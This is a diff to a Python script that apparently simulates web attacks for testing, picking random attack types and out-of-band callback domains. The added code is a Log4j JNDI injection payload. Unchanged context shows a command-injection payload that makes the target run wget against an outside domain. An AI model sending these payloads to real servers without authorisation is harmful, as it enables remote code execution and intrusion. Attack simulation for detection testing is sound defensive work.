@@ -13,7 +13,7 @@ oob_domains = [
 ]
 
 # Define common types of attacks
-attack_types = ['HTTP', 'XSS', 'SQLi', 'XXE', 'Command Injection', 'RCE']
+attack_types = ['HTTP', 'XSS', 'SQLi', 'XXE', 'Command Injection', 'RCE', 'Log4j']
 
 def send_request(method, url, data=None, headers=None):
     """Generic function to send HTTP requests to handle different methods."""
@@ -52,6 +52,11 @@ def simulate_rce(oob_domain):
     payload_url = f"{target_webserver}/app?input=wget%20http://{oob_domain}"
     send_request('GET', payload_url)
 
+def simulate_log4j(oob_domain):
+    malicious_payload = '${jndi:ldap://' + oob_domain + '/a}'
+    payload_url = f"{target_webserver}/log_input?data={malicious_payload}"
+    send_request('GET', payload_url)
+
 def simulate_attack():
     selected_oob_domain = random.choice(oob_domains)
     selected_attack_type = random.choice(attack_types)
@@ -63,7 +68,8 @@ def simulate_attack():
         'SQLi': simulate_sqli,
         'XXE': simulate_xxe,
         'Command Injection': simulate_command_injection,
-        'RCE': simulate_rce
+        'RCE': simulate_rce,
+        'Log4j': simulate_log4j
     }.get(selected_attack_type, lambda x: print("Unknown attack type"))
     
     if attack_function:
